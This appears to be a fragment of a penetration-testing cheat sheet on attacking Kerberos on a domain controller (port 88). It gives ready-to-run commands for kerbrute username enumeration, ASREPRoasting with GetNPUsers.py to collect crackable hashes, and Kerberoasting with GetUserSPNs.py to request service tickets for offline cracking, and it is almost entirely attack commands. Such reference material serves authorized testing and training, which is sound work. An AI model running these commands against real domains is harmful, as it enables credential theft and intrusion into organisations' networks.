...
!!! tip "Start here"
    Port 88 open means you're looking at a domain controller. Start with username enumeration (no creds needed): `kerbrute userenum -d $DOMAIN --dc $DC_IP userlist.txt`. Then immediately try ASREPRoasting, accounts without pre-auth required hand you crackable hashes.
...
```bash
GetNPUsers.py $DOMAIN/ -usersfile users.txt -dc-ip $DC_IP -format hashcat -outputfile asrep-hashes.txt
```
...
```bash
GetUserSPNs.py $DOMAIN/<user>:<pass> -dc-ip $DC_IP -request -outputfile tgs-tickets.txt
```
